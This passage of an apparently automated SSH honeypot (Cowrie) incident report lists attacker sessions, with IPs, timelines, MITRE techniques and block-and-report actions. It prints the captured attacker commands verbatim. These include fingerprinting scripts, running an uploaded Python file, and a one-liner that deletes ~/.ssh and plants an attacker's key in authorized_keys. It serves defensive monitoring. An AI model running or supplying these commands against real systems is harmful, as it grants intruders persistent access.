- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48f9ab005aa3

| Field | Detail |
|---|---|
| **Source IP** | `103.219.32[.]239` |
| **First Seen** | 2026-08-26 16:00 |
| **Last Seen** | 2026-08-26 16:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:00:46` | `cowrie.session.connect` |
| `2026-08-26 16:00:46` | `cowrie.client.version` |
| `2026-08-26 16:00:46` | `cowrie.client.kex` |
| `2026-08-26 16:00:47` | `cowrie.login.success` |
| `2026-08-26 16:00:48` | `cowrie.session.params` |
| `2026-08-26 16:00:48` | `cowrie.command.input` |
| `2026-08-26 16:00:48` | `cowrie.log.closed` |
| `2026-08-26 16:00:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.219.32[.]239` to AbuseIPDB if not already reported
- [ ] Block `103.219.32[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e70968e85a89

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 16:03 |
| **Last Seen** | 2026-08-26 16:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:03:10` | `cowrie.session.connect` |
| `2026-08-26 16:03:10` | `cowrie.client.version` |
| `2026-08-26 16:03:10` | `cowrie.client.kex` |
| `2026-08-26 16:03:11` | `cowrie.login.success` |
| `2026-08-26 16:03:12` | `cowrie.session.params` |
| `2026-08-26 16:03:12` | `cowrie.command.input` |
| `2026-08-26 16:03:12` | `cowrie.command.input` |
| `2026-08-26 16:03:12` | `cowrie.command.input` |
| `2026-08-26 16:03:12` | `cowrie.command.input` |
| `2026-08-26 16:03:12` | `cowrie.command.input` |
| `2026-08-26 16:03:12` | `cowrie.command.success` |
| `2026-08-26 16:03:12` | `cowrie.command.input` |
| `2026-08-26 16:03:12` | `cowrie.command.input` |
| `2026-08-26 16:03:12` | `cowrie.command.input` |
| `2026-08-26 16:03:12` | `cowrie.command.input` |
| `2026-08-26 16:03:12` | `cowrie.log.closed` |
| `2026-08-26 16:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a0db6224f4d

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-26 16:03 |
| **Last Seen** | 2026-08-26 16:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:03:58` | `cowrie.session.connect` |
| `2026-08-26 16:03:58` | `cowrie.client.version` |
| `2026-08-26 16:03:58` | `cowrie.client.kex` |
| `2026-08-26 16:03:58` | `cowrie.login.success` |
| `2026-08-26 16:03:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-894618feeafe

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-26 16:03 |
| **Last Seen** | 2026-08-26 16:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:03:58` | `cowrie.session.connect` |
| `2026-08-26 16:03:58` | `cowrie.client.version` |
| `2026-08-26 16:03:58` | `cowrie.client.kex` |
| `2026-08-26 16:03:59` | `cowrie.login.success` |
| `2026-08-26 16:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68d4b15d34d5

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-26 16:04 |
| **Last Seen** | 2026-08-26 16:06 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:04:07` | `cowrie.session.connect` |
| `2026-08-26 16:04:07` | `cowrie.client.version` |
| `2026-08-26 16:04:07` | `cowrie.client.kex` |
| `2026-08-26 16:04:07` | `cowrie.login.success` |
| `2026-08-26 16:04:08` | `cowrie.session.file_upload` |
| `2026-08-26 16:04:09` | `cowrie.session.params` |
| `2026-08-26 16:04:09` | `cowrie.command.input` |
| `2026-08-26 16:04:09` | `cowrie.command.input` |
| `2026-08-26 16:04:09` | `cowrie.command.input` |
| `2026-08-26 16:04:09` | `cowrie.command.failed` |
| `2026-08-26 16:04:09` | `cowrie.log.closed` |
| `2026-08-26 16:04:10` | `cowrie.session.params` |
| `2026-08-26 16:04:10` | `cowrie.command.input` |
| `2026-08-26 16:04:10` | `cowrie.log.closed` |
| `2026-08-26 16:04:11` | `cowrie.session.params` |
| `2026-08-26 16:04:11` | `cowrie.command.input` |
| `2026-08-26 16:04:11` | `cowrie.log.closed` |
| `2026-08-26 16:04:12` | `cowrie.session.params` |
| `2026-08-26 16:04:12` | `cowrie.command.input` |
| `2026-08-26 16:04:12` | `cowrie.command.failed` |
| `2026-08-26 16:04:12` | `cowrie.command.failed` |
| `2026-08-26 16:05:12` | `cowrie.session.params` |
| `2026-08-26 16:05:12` | `cowrie.command.input` |
| `2026-08-26 16:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edb07a962415

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-26 16:07 |
| **Last Seen** | 2026-08-26 16:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:07:06` | `cowrie.session.connect` |
| `2026-08-26 16:07:06` | `cowrie.client.version` |
| `2026-08-26 16:07:07` | `cowrie.client.kex` |
| `2026-08-26 16:07:07` | `cowrie.login.success` |
| `2026-08-26 16:07:07` | `cowrie.direct-tcpip.request` |
| `2026-08-26 16:07:07` | `cowrie.direct-tcpip.data` |
| `2026-08-26 16:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d37fbb0c9a58

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 16:08 |
| **Last Seen** | 2026-08-26 16:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:08:55` | `cowrie.session.connect` |
| `2026-08-26 16:08:55` | `cowrie.client.version` |
| `2026-08-26 16:08:55` | `cowrie.client.kex` |
| `2026-08-26 16:08:56` | `cowrie.login.success` |
| `2026-08-26 16:08:56` | `cowrie.session.params` |
| `2026-08-26 16:08:56` | `cowrie.command.input` |
| `2026-08-26 16:08:56` | `cowrie.command.input` |
| `2026-08-26 16:08:56` | `cowrie.command.input` |
| `2026-08-26 16:08:56` | `cowrie.command.input` |
| `2026-08-26 16:08:56` | `cowrie.command.input` |
| `2026-08-26 16:08:56` | `cowrie.command.success` |
| `2026-08-26 16:08:56` | `cowrie.command.input` |
| `2026-08-26 16:08:56` | `cowrie.command.input` |
| `2026-08-26 16:08:56` | `cowrie.command.input` |
| `2026-08-26 16:08:56` | `cowrie.command.input` |
| `2026-08-26 16:08:57` | `cowrie.log.closed` |
| `2026-08-26 16:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ca78c95bc20

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 16:12 |
| **Last Seen** | 2026-08-26 16:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:12:07` | `cowrie.session.connect` |
| `2026-08-26 16:12:07` | `cowrie.client.version` |
| `2026-08-26 16:12:07` | `cowrie.client.kex` |
| `2026-08-26 16:12:08` | `cowrie.login.success` |
| `2026-08-26 16:12:08` | `cowrie.session.params` |
| `2026-08-26 16:12:08` | `cowrie.command.input` |
| `2026-08-26 16:12:08` | `cowrie.command.input` |
| `2026-08-26 16:12:08` | `cowrie.command.input` |
| `2026-08-26 16:12:08` | `cowrie.command.input` |
| `2026-08-26 16:12:08` | `cowrie.command.input` |
| `2026-08-26 16:12:08` | `cowrie.command.success` |
| `2026-08-26 16:12:08` | `cowrie.command.input` |
| `2026-08-26 16:12:08` | `cowrie.command.input` |
| `2026-08-26 16:12:08` | `cowrie.command.input` |
| `2026-08-26 16:12:08` | `cowrie.command.input` |
| `2026-08-26 16:12:09` | `cowrie.log.closed` |
| `2026-08-26 16:12:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ca52457f7d6

| Field | Detail |
|---|---|
| **Source IP** | `124.239.153[.]90` |
| **First Seen** | 2026-08-26 16:12 |
| **Last Seen** | 2026-08-26 16:17 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:12:57` | `cowrie.session.connect` |
| `2026-08-26 16:12:57` | `cowrie.client.version` |
| `2026-08-26 16:12:58` | `cowrie.client.kex` |
| `2026-08-26 16:12:59` | `cowrie.login.success` |
| `2026-08-26 16:17:59` | `cowrie.session.file_upload` |
| `2026-08-26 16:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.153[.]90` to AbuseIPDB if not already reported
- [ ] Block `124.239.153[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-221d09c9838b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-26 16:15 |
| **Last Seen** | 2026-08-26 16:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:15:37` | `cowrie.session.connect` |
| `2026-08-26 16:15:37` | `cowrie.client.version` |
| `2026-08-26 16:15:37` | `cowrie.client.kex` |
| `2026-08-26 16:15:38` | `cowrie.login.success` |
| `2026-08-26 16:15:39` | `cowrie.session.params` |
| `2026-08-26 16:15:39` | `cowrie.command.input` |
| `2026-08-26 16:15:39` | `cowrie.command.input` |
| `2026-08-26 16:15:39` | `cowrie.command.input` |
| `2026-08-26 16:15:39` | `cowrie.command.input` |
| `2026-08-26 16:15:39` | `cowrie.command.input` |
| `2026-08-26 16:15:39` | `cowrie.command.success` |
| `2026-08-26 16:15:39` | `cowrie.command.input` |
| `2026-08-26 16:15:39` | `cowrie.command.input` |
| `2026-08-26 16:15:39` | `cowrie.command.input` |
| `2026-08-26 16:15:39` | `cowrie.command.input` |
| `2026-08-26 16:15:39` | `cowrie.log.closed` |
| `2026-08-26 16:15:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23cf0883c912

| Field | Detail |
|---|---|
| **Source IP** | `96.78.175[.]36` |
| **First Seen** | 2026-08-26 16:32 |
| **Last Seen** | 2026-08-26 16:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:32:46` | `cowrie.session.connect` |
| `2026-08-26 16:32:46` | `cowrie.client.version` |
| `2026-08-26 16:32:46` | `cowrie.client.kex` |
| `2026-08-26 16:32:47` | `cowrie.login.success` |
| `2026-08-26 16:32:47` | `cowrie.session.params` |
| `2026-08-26 16:32:47` | `cowrie.command.input` |
| `2026-08-26 16:32:47` | `cowrie.command.failed` |
| `2026-08-26 16:32:48` | `cowrie.log.closed` |
| `2026-08-26 16:32:48` | `cowrie.session.params` |
| `2026-08-26 16:32:48` | `cowrie.command.input` |
| `2026-08-26 16:32:48` | `cowrie.session.file_download` |
| `2026-08-26 16:32:48` | `cowrie.log.closed` |
| `2026-08-26 16:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.78.175[.]36` to AbuseIPDB if not already reported
- [ ] Block `96.78.175[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c15404e8f09c

| Field | Detail |
|---|---|
| **Source IP** | `96.78.175[.]36` |
| **First Seen** | 2026-08-26 16:32 |
| **Last Seen** | 2026-08-26 16:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:32:48` | `cowrie.session.connect` |
| `2026-08-26 16:32:48` | `cowrie.client.version` |
| `2026-08-26 16:32:49` | `cowrie.client.kex` |
| `2026-08-26 16:32:49` | `cowrie.login.success` |
| `2026-08-26 16:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.78.175[.]36` to AbuseIPDB if not already reported
- [ ] Block `96.78.175[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c909c707fd81

| Field | Detail |
|---|---|
| **Source IP** | `96.78.175[.]36` |
| **First Seen** | 2026-08-26 16:32 |
| **Last Seen** | 2026-08-26 16:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:32:49` | `cowrie.session.connect` |
| `2026-08-26 16:32:49` | `cowrie.client.version` |
| `2026-08-26 16:32:49` | `cowrie.client.kex` |
| `2026-08-26 16:32:49` | `cowrie.login.success` |
| `2026-08-26 16:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `96.78.175[.]36` to AbuseIPDB if not already reported
- [ ] Block `96.78.175[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1812341c3bac

| Field | Detail |
|---|---|
| **Source IP** | `186.13.24[.]118` |
| **First Seen** | 2026-08-26 16:53 |
| **Last Seen** | 2026-08-26 16:54 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:53:59` | `cowrie.session.connect` |
| `2026-08-26 16:53:59` | `cowrie.client.version` |
| `2026-08-26 16:54:00` | `cowrie.client.kex` |
| `2026-08-26 16:54:00` | `cowrie.login.success` |
| `2026-08-26 16:54:01` | `cowrie.session.params` |
| `2026-08-26 16:54:01` | `cowrie.command.input` |
| `2026-08-26 16:54:01` | `cowrie.command.failed` |
| `2026-08-26 16:54:02` | `cowrie.log.closed` |
| `2026-08-26 16:54:02` | `cowrie.session.params` |
| `2026-08-26 16:54:02` | `cowrie.command.input` |
| `2026-08-26 16:54:03` | `cowrie.session.file_download` |
| `2026-08-26 16:54:03` | `cowrie.log.closed` |
| `2026-08-26 16:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.13.24[.]118` to AbuseIPDB if not already reported
- [ ] Block `186.13.24[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-082e17f4bc13

| Field | Detail |
|---|---|
| **Source IP** | `186.13.24[.]118` |
| **First Seen** | 2026-08-26 16:54 |
| **Last Seen** | 2026-08-26 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:54:03` | `cowrie.session.connect` |
| `2026-08-26 16:54:03` | `cowrie.client.version` |
| `2026-08-26 16:54:03` | `cowrie.client.kex` |
| `2026-08-26 16:54:04` | `cowrie.login.success` |
| `2026-08-26 16:54:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.13.24[.]118` to AbuseIPDB if not already reported
- [ ] Block `186.13.24[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f7b372c5ba0

| Field | Detail |
|---|---|
| **Source IP** | `186.13.24[.]118` |
| **First Seen** | 2026-08-26 16:54 |
| **Last Seen** | 2026-08-26 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:54:04` | `cowrie.session.connect` |
| `2026-08-26 16:54:04` | `cowrie.client.version` |
| `2026-08-26 16:54:04` | `cowrie.client.kex` |
| `2026-08-26 16:54:05` | `cowrie.login.success` |
| `2026-08-26 16:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.13.24[.]118` to AbuseIPDB if not already reported
- [ ] Block `186.13.24[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e7733fa43e

| Field | Detail |
|---|---|
| **Source IP** | `47.86.57[.]180` |
| **First Seen** | 2026-08-26 16:59 |
| **Last Seen** | 2026-08-26 16:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:59:37` | `cowrie.session.connect` |
| `2026-08-26 16:59:37` | `cowrie.client.version` |
| `2026-08-26 16:59:37` | `cowrie.client.kex` |
| `2026-08-26 16:59:37` | `cowrie.login.success` |
| `2026-08-26 16:59:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.86.57[.]180` to AbuseIPDB if not already reported
- [ ] Block `47.86.57[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17e68ac91cd0

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-26 16:59 |
| **Last Seen** | 2026-08-26 16:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-26 16:59:38` | `cowrie.session.connect` |
| `2026-08-26 16:59:38` | `cowrie.client.version` |
| `2026-08-26 16:59:38` | `cowrie.client.kex` |
| `2026-08-26 16:59:38` | `cowrie.login.success` |
| `2026-08-26 16:59:40` | `cowrie.session.params` |
| `2026-08-26 16:59:40` | `cowrie.command.input` |
| `2026-08-26 16:59:40` | `cowrie.session.file_download` |
| `2026-08-26 16:59:40` | `cowrie.session.file_download` |
| `2026-08-26 16:59:40` | `cowrie.log.closed` |
| `2026-08-26 16:59:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ade32357c753

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-26 17:01 |
| **Last Seen** | 2026-08-26 17:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |
